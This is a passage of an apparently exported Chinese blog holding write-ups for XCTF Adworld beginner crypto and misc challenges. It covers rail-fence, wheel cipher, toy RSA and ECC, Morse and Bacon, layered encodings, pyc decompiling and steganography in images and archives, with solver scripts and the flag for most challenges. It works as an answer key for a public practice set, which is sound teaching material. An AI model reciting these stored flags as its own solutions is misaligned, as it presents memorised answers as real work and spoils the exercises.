结果常规栅栏加密没跑出来，在看到题目有一个数字5盲猜这可能是栅栏加密的key，但是常规的是跑不出来flag的，后面看百科知道有个是www型栅栏加密\nPS:WWW型的加密密钥就不只能是字符串长度的因子，小于其长度的任何一个数都可能是其key值，所以第一步也是确定密钥。\n由题目可知key可能是5，一尝试果然正确，得到flag：cyberpeace{railfence_cipher_gogogo}\n附一个www型栅栏密码的网站： http://www.atoolbox.net/Tool.php?Id=777\n附赠一个栅栏密码的脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  #!/usr/bin/env python3 #常见的栅栏解密 e = input('清输入要解密的字符串\\n') elen = len(e) # 计算字符串长度 field = [] for i in range(2, elen): # 做一个循环，从2开始到数字elen（字符串长度） if elen % i == 0: # 计算那些数字能整除字符串长度 field.append(i) # 将能整出的数字加入到field里面 for f in field: b = elen // f # 用字符串实际长度除以上面计算出能整出的数字f result = {x: '' for x in range(b)} for i in range(elen): # 字符串有多少位，就循环多少次 a = i % b result.update({a: result[a] + e[i]}) # 字符串截断，并更新数据 d = '' for i in range(b): d += result[i] print('分为'+str(f)+'栏时，解密结果为：'+d+'\\n') # 输出结果，并开始下一个循环 #W型加密 string=input(\"输入要加密的字符串\\n\") length = len(string) #猜想不会是一栏,和n栏（滑稽）因为这个就是原来字符串（狗头） #那么，就暴力遍历一波其中的那些⑧ for i in range(2,length): result={x:\"\"for x in range(i)} for a in range(length) : width=i*2-2 num=a%width if(num\u003ci): result.update({num:result[num]+string[a]}) else: ll=2*i-2-num result.update({ll:result[ll]+string[a]}) d='' for k in range(i): d=d+result[k] print(\"分为\"+str(i)+\"栏,结果是：\"+d)   0x06 转轮机加密  题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊\n 看题目可知是转轮机算法\n附件内容如下：\n1: \u003c ZWAXJGDLUBVIQHKYPNTCRMOSFE \u003c 2: \u003c KPBELNACZDTRXMJQOYHGVSFUWI \u003c 3: \u003c BDMAIZVRNSJUWFHTEQGYXPLOCK \u003c 4: \u003c RPLNDVHGFCUKTEBSXQYIZMJWAO \u003c 5: \u003c IHFRLABEUOTSGJVDKCPMNZQWXY \u003c 6: \u003c AMKGHIWPNYCJBFZDRUSLOQXVET \u003c 7: \u003c GWTHSPYBXIZULVKMRAFDCEONJQ \u003c 8: \u003c NOZUTWDCVRJLXKISEFAPMYGHBQ \u003c 9: \u003c XPLTDSRFHENYVUBMCQWAOIKZGJ \u003c 10: \u003c UDNAJFBOWTGVRSCZQKELMXYIHP \u003c 11： \u003c MNBVCXZQWERTPOIUYALSKDJFHG \u003c 12： \u003c LVNCMXZPQOWEIURYTASBKJDFHG \u003c 13： \u003c JZQAWSXCDERFVBGTYHNUMKILOP \u003c 密钥为： 2,3,7,5,13,12,9,1,8,10,4,11,6 密文为：NFQKSEVOQOFNP //TODO：还需要搞清楚转轮机算法的原理，有点混乱现在\n官方wp给出以下python自动化脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import re sss='''1: \u003c ZWAXJGDLUBVIQHKYPNTCRMOSFE \u003c 2: \u003c KPBELNACZDTRXMJQOYHGVSFUWI \u003c 3: \u003c BDMAIZVRNSJUWFHTEQGYXPLOCK \u003c 4: \u003c RPLNDVHGFCUKTEBSXQYIZMJWAO \u003c 5: \u003c IHFRLABEUOTSGJVDKCPMNZQWXY \u003c 6: \u003c AMKGHIWPNYCJBFZDRUSLOQXVET \u003c 7: \u003c GWTHSPYBXIZULVKMRAFDCEONJQ \u003c 8: \u003c NOZUTWDCVRJLXKISEFAPMYGHBQ \u003c 9: \u003c XPLTDSRFHENYVUBMCQWAOIKZGJ \u003c 10: \u003c UDNAJFBOWTGVRSCZQKELMXYIHP \u003c 11 \u003c MNBVCXZQWERTPOIUYALSKDJFHG \u003c 12 \u003c LVNCMXZPQOWEIURYTASBKJDFHG \u003c 13 \u003c JZQAWSXCDERFVBGTYHNUMKILOP \u003c ''' m=\"NFQKSEVOQOFNP\" content=re.findall(r'\u003c (.*?) \u003c',sss,re.S) iv=[2,3,7,5,13,12,9,1,8,10,4,11,6] vvv=[] ans=\"\" for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index) for i in range(0,26): flag=\"\" for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print(flag)   0x07 easy RSA 打开附件查看。\n在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17 求解出d fi=(p-1)(q-1) -------------------------------------------------------------- e*d=1 mod fi d=e^(fi(fi)-1) 感谢舍友的cpp文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include\u003ciostream\u003e#include\u003ccstdio\u003e#define ll long long ll gcd(ll a,ll b,ll\u0026aa,ll\u0026bb){ ll ab=0,ba=0;aa=1;bb=1; while(1){ if(a==0){aa=ba;return b;} ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a; if(b==0){bb=ab;return a;} aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b; } } ll mod_inverse(ll a,ll mod){ ll res,temp; ll d=gcd(a,mod,res,temp); if(d==1)return res; return -1; } int main(){ ll p,q,e,d; p = 473398607161; q = 4511491; e = 17; std::cout\u003c\u003cmod_inverse(e,(p-1)*(q-1))\u003c\u003cstd::endl; }   根据舍友给的rsa的cpp文件改出的python脚本，不会爆longlong哦（虽然原题也不会爆。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  def EX_GCD(a,b,arr): #扩展欧几里得 if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g def ModReverse(a,n): #ax=1(mod n) 求a模n的乘法逆x arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1 ''' while True: a,b = eval(input()) print(ModReverse(a,b)) ''' if __name__=='__main__': while True: l = input(\"p,q,e:\") p,q,e = map(lambda x:int(x),l.split(\",\")) fn = (p-1)*(q-1) #print(l) d = ModReverse(e,fn) print(\"d=%d\"%d)   PS：看官方wp给出了一个GitHub项目地址：一款可以解rsa的工具 https://github.com/3summer/CTF-RSA-tool\n1  python solve.py --verbose --private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491   0x08 Normal_RSA  题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光\n 果然，解rsa都是需要工具的，看完官方wp后，发现只需要ctf-rsa-tools一行代码就能跑出flag来。\n甚至连题目给的样例都是人家example里的（虽然是摘自PCTF。\n1  python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc   不过在看wp时，发现有人给了另一种常规解法\n他的解题思路解题思路是：①使用 openssl 解密.pem 中参数 --\u003e ②参数十六进制转换为十进制 --\u003e ③ 利用 factor 对大整数进行分解，得到 p 和 q --\u003e ④用 rsatool 生成私钥文件: private.pem --\u003e ⑤用 private.pem 解密 flag.enc\n其中第三步factor用到的网站为：http://www.factordb.com/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #1 $openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem #2将得到的modulus用python进行转换 $python \u003e\u003e\u003e 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 87924348264132406875276140514499937145050893665602592992418171647042491658461 \u003e\u003e\u003e #3 进入网站 http://www.factordb.com/ 将大整数分解为p，q #p= 275127860351348928173285174381581152299  #q= 319576316814478949870590164193048041239 #4 利用rsatool 生成私钥文件 private.pem $python rsatool.py -o private.pem -e 65537 -p XXX -q XXX #5 $openssl rsautl -decrypt -in flag.enc -inkey private.pem   0x09 不仅仅是Morse  题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}\n 题目附件给了一大串摩斯电码，按常理找一个网站解密了\n--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.- 摩斯电码解密网站： http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx\n解出来如下，明显嵌套了另外一种加密\nMAY..--.-BE..--.-HAVE..--.-ANOTHER..--.-DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA 因为后面一串AB串，转摩斯翻译不出来，因为不晓得哪里分界，转为二进制也没有思路，百度得知这是培根密码\n培根密码解密网站： http://rumkin.com/tools/cipher/baconian.php\nAB串解得ATTACKANDDEFENCEWORLDISINTERESTING\n记得小写。\n0x0a 混合编码  题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}\n 这题感觉没什么好说的，下载附件发现\nJiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzk7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM2ODsmIzY5OyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjNTI7JiM3NjsmIzEyMjsmIzEwNzsmIzUzOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc3OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiMxMDc7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTIwOyYjNzg7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjODQ7JiM2OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzUwOyYjNzY7JiMxMjI7JiM2OTsmIzEyMDsmIzc4OyYjMTA1OyYjNTY7JiM1MzsmIzc4OyYjMTIxOyYjNTY7JiM1MzsmIzc5OyYjODM7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM5OTsmIzExODsmIzc5OyYjODQ7JiM5OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjNjk7JiMxMTk7JiM3NzsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjNjU7JiMxMTg7JiM3NzsmIzg0OyYjNjU7JiMxMjA7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiMxMDU7JiM1NjsmIzEyMDsmIzc3OyYjNjg7JiM2OTsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzExOTsmIzc2OyYjMTIyOyYjMTA3OyYjNTM7JiM3NjsmIzEyMjsmIzY5OyYjMTE5OyYjNzc7JiM4MzsmIzU2OyYjMTIwOyYjNzc7JiM4NDsmIzEwNzsmIzExODsmIzc3OyYjODQ7JiM2OTsmIzEyMDsmIzc2OyYjMTIyOyYjNjk7JiMxMjA7JiM3ODsmIzY3OyYjNTY7JiMxMjA7JiM3NzsmIzY4OyYjMTAzOyYjMTE4OyYjNzc7JiM4NDsmIzY1OyYjMTE5Ow== 明显的base64编码，解base64得到如下：\n\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#79;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#69;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#52;\u0026#76;\u0026#122;\u0026#107;\u0026#53;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#77;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#107;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#105;\u0026#56;\u0026#120;\u0026#77;\u0026#84;\u0026#69;\u0026#118;\u0026#79;\u0026#84;\u0026#99;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#50;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#105;\u0026#56;\u0026#53;\u0026#78;\u0026#121;\u0026#56;\u0026#53;\u0026#79;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#99;\u0026#118;\u0026#79;\u0026#84;\u0026#99;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#119;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#67;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#65;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#105;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#69;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#119;\u0026#76;\u0026#122;\u0026#107;\u0026#53;\u0026#76;\u0026#122;\u0026#69;\u0026#119;\u0026#77;\u0026#83;\u0026#56;\u0026#120;\u0026#77;\u0026#84;\u0026#107;\u0026#118;\u0026#77;\u0026#84;\u0026#69;\u0026#120;\u0026#76;\u0026#122;\u0026#69;\u0026#120;\u0026#78;\u0026#67;\u0026#56;\u0026#120;\u0026#77;\u0026#68;\u0026#103;\u0026#118;\u0026#77;\u0026#84;\u0026#65;\u0026#119; 明显的unicode编码，解码得到如下\nLzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw 没有明显特征，解一波base64得到如下\n/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100 盲猜Ascii吗\n1 2 3 4 5 6 7  \u003e\u003e\u003e a = '/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100' \u003e\u003e\u003e l = a.split('/') \u003e\u003e\u003e s = '' \u003e\u003e\u003e for i in range(30):#从i+1开始因为/的原因，l[0] = '' ... s += chr(int(l[i+1])) \u003e\u003e\u003e s 'welcometoattackanddefenceworld'   得到flag：cyberpeace{welcometoattackanddefenceworld}\n0x0b easychallenge  题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。\n 下载附件发现是一个pyc文件，明显是一个已经编译的python文件\n百度搜反编译pyc，找到一个在线反编译网站 https://tool.lu/pyc/\n反编译得到源代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  #!/usr/bin/env python # encoding: utf-8 # 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc import base64 def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = ' ' print 'Please Input your flag:' flag = raw_input() final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' if encode3(encode2(encode1(flag))) == final: print 'correct' else: print 'wrong'   易知chr和ord为反函数、x^a^a=x、base64.b32decode()和base64.b32encode()互为反函数\n因此写一个python脚本即可得出flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  \u003e\u003e\u003e final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' \u003e\u003e\u003e import base64 \u003e\u003e\u003e a = base64.b32decode(final)#decode3 \u003e\u003e\u003e a b'\\xa0\\xbe\\xa7Z\\xb7\\xb5Z\\xa6\\xa0Z\\xb8\\xae\\xa3\\xa9Z\\xb7Z\\xb0\\xa9\\xae\\xa3\\xa4\\xad\\xad\\xad\\xad\\xad\\xb2' #注意要将a的字节流转换 \u003e\u003e\u003e b = \"\\xa0\\xbe\\xa7Z\\xb7\\xb5Z\\xa6\\xa0Z\\xb8\\xae\\xa3\\xa9Z\\xb7Z\\xb0\\xa9\\xae\\xa3\\xa4\\xad\\xad\\xad\\xad\\xad\\xb2\" \u003e\u003e\u003e s = ''#decode2 \u003e\u003e\u003e for i in b: ... s += chr((ord(i)^36)-36) ... \u003e\u003e\u003e \u003e\u003e\u003e s '`v_ZomZ^`ZxfciZoZpifc\\\\eeeeer' \u003e\u003e\u003e l = ''#decode1 \u003e\u003e\u003e for i in s: ... l+= chr((ord(i)-25)^36) ... \u003e\u003e\u003e l 'cyberpeace{interestinghhhhh}'   PS：\n1 2 3 4 5 6 7 8 9 10 11 12 13  #编译python文件为.pyc文件 $python -m compileall main.py #pyc的反编译 #依赖python的uncompyle $pip install uncompyle #查看帮助 $uncompyle6 --help #将models.pyc反编译成models.py $uncompyle6 models.pyc \u003e models.py   利用uncompyle6反编译的pyc文件和在线编译文件相同，也挺快的\n0x0c easy_ECC  题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}\n 由题目可知：这是ECC加密\n已知椭圆曲线加密Ep(a,b)参数为 p = 15424654874903 a = 16546484 b = 4548674875 G(6478678675,5636379357093) 私钥为 k = 546768 求公钥K(x,y) 又因为题目说工具，了解其算法后，便找到了一个python的脚本计算公钥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164  import collections import random EllipticCurve = collections.namedtuple('EllipticCurve', 'name p a b g n h') curve = EllipticCurve( 'secp256k1', # Field characteristic. p=int(input('p=')), # Curve coefficients. a=int(input('a=')), b=int(input('b=')), # Base point. g=(int(input('Gx=')), int(input('Gy='))), # Subgroup order. n=int(input('k=')), # Subgroup cofactor. h=1, ) # Modular arithmetic ########################################################## def inverse_mod(k, p): \"\"\"Returns the inverse of k modulo p. This function returns the only integer x such that (x * k) % p == 1. k must be non-zero and p must be a prime. \"\"\" if k == 0: raise ZeroDivisionError('division by zero') if k \u003c 0: # k ** -1 = p - (-k) ** -1 (mod p) return p - inverse_mod(-k, p) # Extended Euclidean algorithm. s, old_s = 0, 1 t, old_t = 1, 0 r, old_r = p, k while r != 0: quotient = old_r // r old_r, r = r, old_r - quotient * r old_s, s = s, old_s - quotient * s old_t, t = t, old_t - quotient * t gcd, x, y = old_r, old_s, old_t assert gcd == 1 assert (k * x) % p == 1 return x % p # Functions that work on curve points ######################################### def is_on_curve(point): \"\"\"Returns True if the given point lies on the elliptic curve.\"\"\" if point is None: # None represents the point at infinity. return True x, y = point return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0 def point_neg(point): \"\"\"Returns -point.\"\"\" assert is_on_curve(point) if point is None: # -0 = 0 return None x, y = point result = (x, -y % curve.p) assert is_on_curve(result) return result def point_add(point1, point2): \"\"\"Returns the result of point1 + point2 according to the group law.\"\"\" assert is_on_curve(point1) assert is_on_curve(point2) if point1 is None: # 0 + point2 = point2 return point2 if point2 is None: # point1 + 0 = point1 return point1 x1, y1 = point1 x2, y2 = point2 if x1 == x2 and y1 != y2: # point1 + (-point1) = 0 return None if x1 == x2: # This is the case point1 == point2. m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p) else: # This is the case point1 != point2. m = (y1 - y2) * inverse_mod(x1 - x2, curve.p) x3 = m * m - x1 - x2 y3 = y1 + m * (x3 - x1) result = (x3 % curve.p, -y3 % curve.p) assert is_on_curve(result) return result def scalar_mult(k, point): \"\"\"Returns k * point computed using the double and point_add algorithm.\"\"\" assert is_on_curve(point) if k \u003c 0: # k * point = -k * (-point) return scalar_mult(-k, point_neg(point)) result = None addend = point while k: if k \u0026 1: # Add. result = point_add(result, addend) # Double. addend = point_add(addend, addend) k \u003e\u003e= 1 assert is_on_curve(result) return result # Keypair generation and ECDHE ################################################ def make_keypair(): \"\"\"Generates a random private-public key pair.\"\"\" private_key = curve.n public_key = scalar_mult(private_key, curve.g) return private_key, public_key private_key, public_key = make_keypair() print(\"private key:\", hex(private_key)) print(\"public key: (0x{:x}, 0x{:x})\".format(*public_key))   1 2 3 4 5 6 7 8 9 10 11 12 13 14  $python ecc_calKey.py p=15424654874903 a=16546484 b=4548674875 Gx=6478678675 Gy=5636379357093 k=546768 private key: 0x857d0 public key: (0xcb19fe553fa, 0x50545408eb4) $python \u003e\u003e\u003e 0x50545408eb4+0xcb19fe553fa 19477226185390 \u003e\u003e\u003e   ","description":"","tags":["ctf","crypto"],"title":"XCTF-adworld-crypto-wp","uri":"/posts/xctf-adworld-crypto-wp/"},{"categories":["misc"],"content":"Misc\u0026WriteUp msic永远充满了惊喜\n攻防世界\u0026Misc新手练习区 0x01 this_is_flag  题目描述： Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}\n 易知flag为：flag{th1s_!s_a_d4m0_4la9} \n0x02 ext3  题目描述： 今天是菜狗的生日，他收到了一个linux系统光盘\n 下载附件得到一个19.5MB的文件，由于题目是ext3，所以联想到将该文件挂载至linux下\n运行mount test /mnt/,然后发现下面有一堆文件\n执行find |grep flag，得到./O7avZhikgKgbF/flag.txt\n用cat命令查看文件，得到一串字符ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=\n明显的base64编码，转码得到flag：flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj} \n 但是看官方wp，发现是另外一种做法。\n不知道为啥判断附件为img格式，然后用winhex打开该文件搜索flag得到如下\n然后解压该文件（我用bandzip没有打开，改后缀为img装载显示光盘映像已损坏），搜索得到flag.txt，然后其他步骤相同\n0x03 give_you_flag  题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包\n 下载附件，发现是一个gif文件，打开查看发现在最后几秒闪过一个二维码\n第一次做傻傻地用了linux下convert命令，将gif转到png，发现50多帧都被拆分成一个个png，\n二维码大概在49帧，后面才发现有Stegsolve可以查看图片的每一帧\n明显是个二维码，修补其三角定位，得到下图\n扫码得到flag： flag{e7d478cf6b915f50ab1277f78502a2c5}\n0x04 pdf  题目描述：菜猫给了菜狗一张图，说图下面什么都没有\n 打开附件是一个pdf，里面是一张图片，推测将pdf转为word格式之后，移走图片，发现flag就在图片底下\n易知得到flag：flag{security_through_obscurity}\n0x05 stegano  题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写\n 打开附件发现一份文档\n一开始没有思路，就先用之前的convert命令，将pdf的东西全部复制出来查看，发现\n将AB转换为. - 可得到如下\n -.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...-- 解摩斯密码得到：CONGRATULATIONSFLAG1NV151BL3M3554G3\nflag为：flag{1NV151BL3M3554G3}\n0x06 SimpleRAR  题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层)\n 下载完附件，只有一个文件，打开flag.txt ,里面写着flag is not here\n打开winhex查看该rar，发现里面还有一个secret.png，然后根据文件头（或者使用rar修复） 将A8 3C 7A 修改为 A8 3C 74 。\n然后解压得到secret.png，打开是一个空白图片，便想到用winhex查看。\n发现文件头是GIF，将后缀改为.gif，然后用Stegsolve分离出两帧图片，分别是二维码的上下部分，还少定位符，补齐定位符，扫码得到flag：flag：flag{yanji4n_bu_we1shi}\n0x07 坚持60s  题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡\n 下下来是一个jar包，用java运行，发现是一个小游戏，根据题目联想需要坚持60s。\n玩了几次之后手残放弃，然后解压缩文件，用winhex打开文件搜索flag，在/cn/bjsxt/plane/PlaneGameFrame.class里找到 flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}易知是base64编码，base64decode得到flag{DajiDali_JinwanChiji}\n第二种办法，我在找到flag后思考这是misc题也不是逆向题，便觉得这游戏肯定有bug，然后根据常识发现右边和下面的边界可以穿过来躲避障碍，但是完全卡入右边界之后无法返回。\n之后发现到下边只能卡入一半，于是突发思维，将小方块卡入右下角然后留下了一个小角，发现可以成功躲过60s（记得计时，在60s~70s时主动出去死亡即可，然后成功得到flag明文\n0x08 gif  题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机\n 得到一个zip包，查看里面有103张黑白色的图片，联想到二进制。\n白色图片代表0，黑色图片代表1。\n01100110前八位二进制换算后为 f 证明思路正确。\n01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101\n二进制转字符串得到 flag：flag{FuN_giF}\n0x09 掀桌子  题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻\n 题目只有描述中这一段字符串有信息，推测是十六进制，写python的转换代码\n每两个一组，将16进制转换为10进制，减去128以后输出 ascii。\n得到Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr\n0x0a 如来十三掌  题目描述：菜狗为了打败菜猫，学了一套如来十三掌。\n 下下来附件是一个docx，发现是一段文字，贼像佛教里的文字\n搜索得到这是一种佛语加密，在网站 http://keyfc.net/bbs/tools/tudoucode.aspx 与佛论禅 可以翻译，但是将全文复制到chrome和firefox打开的网站里都解码失败了，后看他的说明，推测应该在复制过程中会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。试验过在MicrosoftEdge中能够成功解码。\n解完是一串像base64编码的字符MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9，但是该字符解码得到是一串乱码，然后发现这个字符串需要先用rot13（与题目“如来十三掌”谐音）转一下，然后再base64解码，得到flag。\n0x0b base64stego  题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓\n 打开压缩包，压缩包是伪加密的根据ctf-wiki里直接用winhex改一个标志位，或者用winrar修复即可\n是一个stego.txt可以看到很多行的base64编码\n解码出来是在wiki百科上对Steganography的解释\nSteganography is the art and science of writing hidden messages in such a way that no one , apart from the sender and intended recipient, suspe cts the existence of the mess age, a form of security through obscurity. T he word steganography is of Greek origin and means \"concea led writing\" 